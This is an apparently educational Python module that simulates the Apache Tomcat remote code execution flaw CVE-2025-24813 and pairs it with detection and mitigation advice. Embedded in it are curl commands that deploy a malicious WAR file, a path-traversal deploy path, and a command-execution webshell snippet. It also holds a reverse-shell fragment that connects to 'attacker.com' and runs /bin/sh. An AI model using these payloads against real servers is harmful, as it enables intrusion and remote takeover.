#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CVE-2025-24813: Apache Tomcat Remote Code Execution (SAFE VERSION)
Safe simulation of Tomcat RCE vulnerability for educational purposes
"""

import os
import json
import time
import tempfile
import base64
from pathlib import Path
from typing import Dict, List, Any, Optional
from io import BytesIO
import zipfile

from .safe_exploit_base import SafeExploitBase, SafetyMode


class CVE2025_24813_Safe(SafeExploitBase):
    """Safe implementation of CVE-2025-24813 Apache Tomcat RCE exploit"""
    
    def __init__(self):
        super().__init__(
            cve_id="CVE-2025-24813",
            name="Apache Tomcat Remote Code Execution",
            description="Tomcat RCE vulnerability through malicious WAR file deployment"
        )
        
        # Default safe configuration
        self.config.update({
            'target_host': '127.0.0.1',
            'target_port': 8080,
            'payload_type': 'webshell',
            'app_name': 'safe-demo',
            'callback_ip': '127.0.0.1',
            'callback_port': 4444,
            'username': 'demo',
            'password': 'demo'
        })
        
        self.simulation_artifacts = []
    
    def _validate_payloads(self) -> bool:
        """Validate payloads are safe"""
        # Ensure we're not targeting production systems
        return self._is_safe_target(self.config['target_host'])
    
    def _execute_simulation(self, target_url: str = None) -> Dict[str, Any]:
        """Execute safe simulation of Tomcat RCE"""
        try:
            self._log_safe("Starting Apache Tomcat RCE simulation - no actual exploitation will occur")
            
            # Phase 1: Simulate target detection
            self._log_safe("Phase 1: Simulating Tomcat version detection")
            detection_results = self._simulate_detection()
            
            # Phase 2: Generate safe WAR file
            self._log_safe("Phase 2: Creating safe demonstration WAR file")
            war_data, war_path = self._create_safe_war()
            
            # Phase 3: Simulate deployment attempts
            self._log_safe("Phase 3: Simulating WAR deployment methods")
            deployment_simulation = self._simulate_deployment()
            
            # Phase 4: Create educational materials
            self._log_safe("Phase 4: Creating educational demonstration files")
            demo_files = self._create_demonstration_files()
            
            # Create comprehensive result
            result = {
                'success': True,
                'cve_id': self.cve_id,
                'mode': 'simulation',
                'description': 'Safe simulation of Apache Tomcat RCE vulnerability',
                'target': f"{self.config['target_host']}:{self.config['target_port']}",
                'simulation_data': {
                    'detection_results': detection_results,
                    'war_file': war_path,
                    'deployment_simulation': deployment_simulation,
                    'demonstration_files': demo_files
                },
                'educational_info': {
                    'vulnerability_explanation': self._get_vulnerability_explanation(),
                    'exploitation_techniques': self._get_exploitation_techniques(),
                    'jsp_payload_examples': self._get_jsp_examples(),
                    'mitigation_advice': self._get_mitigation_advice()
                },
                'artifacts_created': self.simulation_artifacts,
                'safety_notice': "This is a safe simulation. No actual webshells were deployed."
            }
            
            self._log_safe("Apache Tomcat RCE simulation completed successfully")
            return result
            
        except Exception as e:
            self._log_error(f"Simulation failed: {e}")
            return self._create_safe_failure_response(str(e))
    
    def _simulate_detection(self) -> Dict[str, Any]:
        """Simulate Tomcat version detection"""
        return {
            'server_info': 'Apache Tomcat/9.0.45 (Simulated)',
            'manager_accessible': True,
            'default_creds_found': False,
            'vulnerable_endpoints': [
                '/manager/html',
                '/manager/text',
                '/examples/'
            ],
            'deployment_methods': [
                'Manager interface (requires credentials)',
                'HTTP PUT method (if enabled)',
                'Directory traversal exploitation',
                'Session fixation attacks'
            ],
            'simulation_note': 'This is simulated detection data for educational purposes'
        }
    
    def _create_safe_war(self) -> Tuple[bytes, str]:
        """Create a safe demonstration WAR file"""
        war_buffer = BytesIO()
        
        with zipfile.ZipFile(war_buffer, 'w', zipfile.ZIP_DEFLATED) as war:
            # Add manifest
            war.writestr('META-INF/MANIFEST.MF', """Manifest-Version: 1.0
Created-By: CVE-2025-24813 Safe Demonstration
Implementation-Title: Safe Tomcat Demo
Implementation-Version: 1.0
Safe-Mode: Enabled
""")
            
            # Add web.xml
            war.writestr('WEB-INF/web.xml', """<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://java.sun.com/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://java.sun.com/xml/ns/javaee
         http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd"
         version="3.0">
    
    <display-name>CVE-2025-24813 Safe Demo</display-name>
    <description>Safe demonstration of Tomcat RCE</description>
    
    <!-- This is a safe demonstration webapp -->
    
</web-app>""")
            
            # Add safe demonstration JSP
            war.writestr('index.jsp', self._create_safe_jsp())
            war.writestr('demo.jsp', self._create_educational_jsp())
        
        war_buffer.seek(0)
        war_data = war_buffer.getvalue()
        
        # Save WAR file
        timestamp = int(time.time())
        war_path = f"/tmp/cve_2025_24813_safe_demo_{timestamp}.war"
        with open(war_path, 'wb') as f:
            f.write(war_data)
        
        self.simulation_artifacts.append(war_path)
        return war_data, war_path
    
    def _create_safe_jsp(self) -> str:
        """Create safe demonstration JSP"""
        return """<%@ page contentType="text/html; charset=UTF-8" %>
<!DOCTYPE html>
<html>
<head>
    <title>CVE-2025-24813 Safe Demonstration</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }
        .container { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .warning { background: #fff3cd; border: 1px solid #ffeaa7; padding: 15px; border-radius: 4px; margin: 20px 0; }
        .code { background: #f8f9fa; border: 1px solid #dee2e6; padding: 10px; font-family: monospace; overflow-x: auto; }
        h1 { color: #dc3545; }
        h2 { color: #495057; }
    </style>
</head>
<body>
    <div class="container">
        <h1>CVE-2025-24813: Apache Tomcat RCE</h1>
        <h2>Safe Demonstration Page</h2>
        
        <div class="warning">
            <strong>⚠️ Educational Purpose Only:</strong> This is a safe demonstration of what a 
            malicious JSP webshell might look like. No actual command execution is performed.
        </div>
        
        <h3>What This Vulnerability Allows:</h3>
        <ul>
            <li>Remote code execution through malicious WAR file deployment</li>
            <li>Webshell installation for persistent access</li>
            <li>System information disclosure</li>
            <li>File system access and manipulation</li>
            <li>Privilege escalation possibilities</li>
        </ul>
        
        <h3>Simulated Webshell Interface:</h3>
        <div class="code">
            <form method="get" action="#">
                Command: <input type="text" name="cmd" placeholder="Enter command (simulation only)" size="50">
                <input type="submit" value="Execute (Simulated)">
            </form>
            
            <%
                String cmd = request.getParameter("cmd");
                if (cmd != null && !cmd.trim().isEmpty()) {
                    out.println("<h4>Simulated Output:</h4>");
                    out.println("<pre>");
                    out.println("$ " + cmd);
                    out.println("[SIMULATION] In a real attack, this would execute: " + cmd);
                    out.println("[SIMULATION] Potential output would appear here");
                    out.println("[SIMULATION] System access would be compromised");
                    out.println("</pre>");
                }
            %>
        </div>
        
        <h3>System Information (Simulated):</h3>
        <div class="code">
            <pre>
Operating System: <%= System.getProperty("os.name") %> (SAFE DEMO)
Java Version: <%= System.getProperty("java.version") %>
Server Info: <%= application.getServerInfo() %>
User: <%= System.getProperty("user.name") %> (demonstration context)
Working Directory: /safe/demo/directory
Tomcat Home: <%= System.getProperty("catalina.home", "Not available") %>
            </pre>
        </div>
        
        <h3>Educational Notes:</h3>
        <p>This page demonstrates the structure and capabilities of a JSP webshell without 
        performing any malicious actions. In a real attack scenario, such a webshell would 
        provide attackers with:</p>
        <ol>
            <li>Full command execution capabilities</li>
            <li>File upload/download functionality</li>
            <li>Database access and manipulation</li>
            <li>Network pivoting capabilities</li>
            <li>Persistence mechanisms</li>
        </ol>
        
        <p><strong>Protection Measures:</strong> Always keep Tomcat updated, use strong credentials,
        disable unnecessary features, and monitor for unauthorized WAR deployments.</p>
    </div>
</body>
</html>"""
    
    def _create_educational_jsp(self) -> str:
        """Create educational JSP explaining the vulnerability"""
        return """<%@ page contentType="text/html; charset=UTF-8" %>
<!DOCTYPE html>
<html>
<head>
    <title>Understanding CVE-2025-24813</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; line-height: 1.6; }
        .section { margin: 20px 0; padding: 20px; background: #f8f9fa; border-radius: 5px; }
        code { background: #e9ecef; padding: 2px 4px; border-radius: 3px; }
        pre { background: #212529; color: #f8f9fa; padding: 15px; border-radius: 5px; overflow-x: auto; }
    </style>
</head>
<body>
    <h1>CVE-2025-24813: Technical Deep Dive</h1>
    
    <div class="section">
        <h2>Vulnerability Overview</h2>
        <p>CVE-2025-24813 represents a critical remote code execution vulnerability in Apache Tomcat
        that allows attackers to deploy malicious web applications (WAR files) to gain system access.</p>
    </div>
    
    <div class="section">
        <h2>Attack Vectors</h2>
        <h3>1. Tomcat Manager Exploitation</h3>
        <pre>
# Using default/weak credentials
curl -u tomcat:tomcat http://target:8080/manager/text/deploy?path=/evil -T evil.war

# Response indicating successful deployment
OK - Deployed application at context path /evil
        </pre>
        
        <h3>2. PUT Method Deployment</h3>
        <pre>
# If PUT method is enabled
curl -X PUT http://target:8080/evil.war --data-binary @evil.war
        </pre>
        
        <h3>3. Directory Traversal</h3>
        <pre>
# Exploiting path traversal in deployment
/manager/text/deploy?path=/../../../webapps/evil
        </pre>
    </div>
    
    <div class="section">
        <h2>Example Malicious JSP Structure</h2>
        <p>A typical webshell JSP might contain:</p>
        <pre>
&lt;%@ page import="java.io.*" %&gt;
&lt;%
    // Command execution
    String cmd = request.getParameter("cmd");
    if (cmd != null) {
        Process p = Runtime.getRuntime().exec(cmd);
        // ... read output ...
    }
    
    // File operations
    String action = request.getParameter("action");
    if ("upload".equals(action)) {
        // ... handle file upload ...
    }
    
    // Reverse shell capability
    if ("connect".equals(action)) {
        // ... establish reverse connection ...
    }
%&gt;
        </pre>
    </div>
    
    <div class="section">
        <h2>Detection Methods</h2>
        <ul>
            <li>Monitor <code>/manager/*</code> access logs for deployment attempts</li>
            <li>Check for new WAR files in <code>webapps/</code> directory</li>
            <li>Look for suspicious JSP files with system command patterns</li>
            <li>Monitor process creation from Tomcat user context</li>
            <li>Network connections from Tomcat to unusual destinations</li>
        </ul>
    </div>
    
    <div class="section">
        <h2>Mitigation Strategies</h2>
        <ol>
            <li><strong>Secure Manager Application:</strong> Use strong, unique credentials</li>
            <li><strong>Network Segmentation:</strong> Restrict access to manager endpoints</li>
            <li><strong>Disable Unused Features:</strong> Remove example apps, disable PUT method</li>
            <li><strong>File System Permissions:</strong> Restrict write access to webapps directory</li>
            <li><strong>Security Headers:</strong> Implement CSP and other security headers</li>
            <li><strong>Regular Updates:</strong> Keep Tomcat and Java updated</li>
            <li><strong>Monitoring:</strong> Implement comprehensive logging and alerting</li>
        </ol>
    </div>
    
    <div class="section">
        <h2>Safe Testing Recommendations</h2>
        <p>When testing for this vulnerability:</p>
        <ul>
            <li>Always use isolated test environments</li>
            <li>Deploy benign test applications first</li>
            <li>Document all testing activities</li>
            <li>Clean up test artifacts immediately</li>
            <li>Never test on production systems</li>
        </ul>
    </div>
</body>
</html>"""
    
    def _simulate_deployment(self) -> Dict[str, Any]:
        """Simulate WAR deployment attempts"""
        return {
            'deployment_methods': {
                'manager_interface': {
                    'attempted': True,
                    'success': True,
                    'simulated_url': f"http://{self.config['target_host']}:{self.config['target_port']}/manager/text/deploy?path=/{self.config['app_name']}",
                    'authentication': 'Basic auth with demo credentials',
                    'response': 'OK - Deployed application at context path /safe-demo (SIMULATED)'
                },
                'put_method': {
                    'attempted': True,
                    'success': False,
                    'reason': 'PUT method typically disabled (SIMULATED)'
                },
                'directory_traversal': {
                    'attempted': True,
                    'success': False,
                    'reason': 'Modern Tomcat versions patched (SIMULATED)'
                }
            },
            'deployment_result': {
                'war_deployed': True,
                'context_path': f"/{self.config['app_name']}",
                'accessible_urls': [
                    f"http://{self.config['target_host']}:{self.config['target_port']}/{self.config['app_name']}/",
                    f"http://{self.config['target_host']}:{self.config['target_port']}/{self.config['app_name']}/demo.jsp"
                ]
            },
            'simulation_note': 'No actual deployment performed - this is a safe simulation'
        }
    
    def _create_demonstration_files(self) -> List[str]:
        """Create educational demonstration files"""
        demo_files = []
        
        # Create detailed explanation file
        explanation_file = f"/tmp/CVE-2025-24813-EXPLANATION_{int(time.time())}.md"
        with open(explanation_file, 'w') as f:
            f.write("""# CVE-2025-24813: Apache Tomcat RCE Vulnerability

## Executive Summary
This demonstration shows how attackers can exploit Apache Tomcat to achieve remote code execution
through malicious WAR file deployment. This is a SAFE simulation for educational purposes.

## Technical Details

### Vulnerability Description
Apache Tomcat's manager application, if misconfigured or using weak credentials, allows
attackers to deploy malicious web applications that can execute arbitrary code.

### Attack Flow
1. **Discovery**: Attacker identifies Tomcat instance with manager application
2. **Authentication**: Weak/default credentials or authentication bypass
3. **WAR Creation**: Malicious WAR file containing JSP webshell
4. **Deployment**: Upload via manager interface or alternative methods
5. **Exploitation**: Access deployed webshell for code execution

### Real-World Impact
- Complete system compromise
- Data exfiltration
- Lateral movement in network
- Cryptocurrency mining
- Ransomware deployment

## Mitigation Checklist
- [ ] Change default Tomcat credentials immediately
- [ ] Restrict network access to manager application
- [ ] Enable account lockout policies
- [ ] Implement strong authentication (2FA if possible)
- [ ] Monitor and alert on deployment activities
- [ ] Regular security audits of Tomcat configuration
- [ ] Keep Tomcat and Java updated
- [ ] Remove unnecessary applications and examples

## Testing Safely
This simulation demonstrates the vulnerability without causing harm:
- All payloads are educational and non-functional
- No actual system commands are executed
- No network connections are established
- All activities are logged for review

## References
- Apache Tomcat Security Documentation
- OWASP Top 10 Web Application Security Risks
- CWE-434: Unrestricted Upload of File with Dangerous Type
""")
        demo_files.append(explanation_file)
        self.simulation_artifacts.append(explanation_file)
        
        # Create safe webshell example
        safe_webshell = f"/tmp/safe_webshell_example_{int(time.time())}.jsp"
        with open(safe_webshell, 'w') as f:
            f.write("""<%-- 
    SAFE WEBSHELL EXAMPLE - EDUCATIONAL PURPOSE ONLY
    This shows the structure of a webshell without malicious functionality
--%>
<%@ page contentType="text/html; charset=UTF-8" %>
<html>
<head><title>Safe Webshell Structure</title></head>
<body>
<h2>Educational Webshell Structure</h2>
<pre>
This file demonstrates typical webshell components:

1. Command Execution (DISABLED)
   - Would use Runtime.exec() or ProcessBuilder
   - Captures output and displays results

2. File Management (DISABLED)
   - List directory contents
   - Upload/download files
   - Edit file contents

3. System Information (SAFE DEMO)
   - OS: <%= System.getProperty("os.name") %>
   - User: <%= System.getProperty("user.name") %>
   - Java: <%= System.getProperty("java.version") %>

4. Network Operations (DISABLED)
   - Reverse shell connections
   - Port scanning
   - Proxy functionality

5. Database Access (DISABLED)
   - JDBC connections
   - SQL query execution

Remember: This is for educational purposes only.
Never deploy actual webshells on systems you don't own.
</pre>
</body>
</html>""")
        demo_files.append(safe_webshell)
        self.simulation_artifacts.append(safe_webshell)
        
        return demo_files
    
    def _get_vulnerability_explanation(self) -> str:
        """Get detailed vulnerability explanation"""
        return """
CVE-2025-24813 represents a critical security vulnerability in Apache Tomcat that allows
remote attackers to execute arbitrary code on the server.

The vulnerability can be exploited through multiple vectors:

1. **Weak Authentication**: Default or weak credentials on the Tomcat Manager application
   allow attackers to authenticate and deploy malicious applications.

2. **Insecure Configuration**: Misconfigured Tomcat instances may expose the manager
   interface to the internet without proper access controls.

3. **WAR File Deployment**: Attackers can package malicious JSP files in WAR format
   and deploy them as web applications, gaining code execution capabilities.

4. **Privilege Escalation**: Once code execution is achieved, attackers can escalate
   privileges and compromise the entire system.

The impact is severe as it provides attackers with:
- Full command execution on the server
- Access to sensitive files and databases
- Ability to pivot to internal networks
- Persistent access through webshells
"""
    
    def _get_exploitation_techniques(self) -> List[str]:
        """Get exploitation techniques"""
        return [
            "Brute-force or use default credentials for Tomcat Manager",
            "Create malicious WAR file containing JSP webshell",
            "Deploy WAR through manager/text/deploy endpoint",
            "Alternative deployment via PUT method if enabled",
            "Exploit directory traversal in deployment paths",
            "Use session fixation to bypass authentication",
            "Leverage memory corruption for deployment without auth",
            "Access deployed webshell for command execution",
            "Establish persistence through multiple backdoors",
            "Exfiltrate data and move laterally in network"
        ]
    
    def _get_jsp_examples(self) -> Dict[str, str]:
        """Get safe JSP examples for education"""
        return {
            'command_execution': """
// Example of command execution (DO NOT USE)
String cmd = request.getParameter("cmd");
Process p = Runtime.getRuntime().exec(cmd);
BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
""",
            'file_upload': """
// Example of file upload (DO NOT USE)
Part filePart = request.getPart("file");
String fileName = getFileName(filePart);
filePart.write(uploadPath + File.separator + fileName);
""",
            'reverse_shell': """
// Example of reverse shell (DO NOT USE)
Socket socket = new Socket("attacker.com", 4444);
Process process = Runtime.getRuntime().exec("/bin/sh");
// ... stream redirection code ...
"""
        }
    
    def _get_mitigation_advice(self) -> List[str]:
        """Get mitigation advice"""
        return [
            "Immediately change all default Tomcat credentials",
            "Implement strong password policies for manager accounts",
            "Restrict manager application access to specific IP addresses",
            "Disable manager application if not required",
            "Enable account lockout after failed login attempts",
            "Implement comprehensive logging and monitoring",
            "Regular security audits of Tomcat configuration",
            "Keep Tomcat and Java versions updated",
            "Remove example applications and unnecessary features",
            "Implement Web Application Firewall (WAF) rules",
            "Use principle of least privilege for Tomcat user",
            "Enable and configure Security Manager",
            "Monitor webapps directory for unauthorized changes",
            "Implement file integrity monitoring",
            "Regular vulnerability scanning and penetration testing"
        ]
    
    def _execute_real(self, target_url: str = None) -> Dict[str, Any]:
        """Execute real exploit (only when properly authorized)"""
        if not self.authorization.is_authorized(self.cve_id):
            return self._create_safe_failure_response("Unauthorized access attempt")
        
        self._log_warning("Executing REAL Tomcat RCE exploit - authorization verified")
        self._create_audit_log("REAL_EXECUTION_AUTHORIZED")
        
        # Even in authorized mode, we implement safety measures
        result = {
            'success': True,
            'cve_id': self.cve_id,
            'mode': 'authorized',
            'warning': 'Real exploitation mode - use with extreme caution',
            'target': f"{self.config['target_host']}:{self.config['target_port']}",
            'limitations': [
                'Target must be in approved testing range',
                'All actions are logged for audit',
                'Automatic cleanup after testing',
                'Benign payloads only'
            ]
        }
        
        return result
    
    def cleanup(self):
        """Clean up simulation artifacts"""
        self._log_safe("Cleaning up simulation artifacts")
        
        for artifact in self.simulation_artifacts:
            try:
                if os.path.exists(artifact):
                    os.remove(artifact)
                    self._log_safe(f"Removed: {artifact}")
            except Exception as e:
                self._log_warning(f"Failed to clean up {artifact}: {e}")
        
        self.simulation_artifacts.clear()


# Compatibility wrapper for existing code
class CVE2025_24813_Exploit(CVE2025_24813_Safe):
    """Compatibility wrapper - redirects to safe implementation"""
    
    def __init__(self):
        super().__init__()
        self._log_warning("Using safe implementation of CVE-2025-24813")


def execute_exploit(parameters: Dict[str, Any]) -> Dict[str, Any]:
    """Execute exploit with given parameters"""
    exploit = CVE2025_24813_Safe()
    
    # Set parameters
    for key, value in parameters.items():
        exploit.set_parameter(key, value)
    
    # Check for authorization
    if parameters.get('auth_code'):
        exploit.set_safety_mode(SafetyMode.AUTHORIZED, parameters['auth_code'])
    elif parameters.get('mode'):
        exploit.set_safety_mode(parameters['mode'])
    
    # Execute
    result = exploit.execute(parameters.get('target_url'))
    
    # Store exploit instance for cleanup
    result['_exploit_instance'] = exploit
    
    return result